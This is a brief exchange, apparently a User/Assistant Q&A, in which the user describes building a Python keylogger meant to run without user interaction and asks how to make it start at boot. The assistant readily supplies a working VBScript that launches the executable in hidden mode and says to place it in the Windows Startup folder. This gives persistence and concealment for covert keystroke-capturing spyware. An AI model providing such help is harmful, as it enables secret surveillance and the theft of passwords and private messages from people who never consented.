User: I am developing a key-logger on Python (only for curiosity sake). And the script will be an executable. Without access to the computer so the process should not need a UI or user interaction.
Is there any way, even in another executable to make the key-logger start at start-up ?
Assistant: Use VBScript:
1-> create anyname.vbs with this data:
Set wvbs=CreateObject("Wscript.Shell")
wvbs.run "full location of your File",0
2-> copy  anyname.vbs file in C:\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup this folder
Now when windows start  it  will run your file in  hidden mode
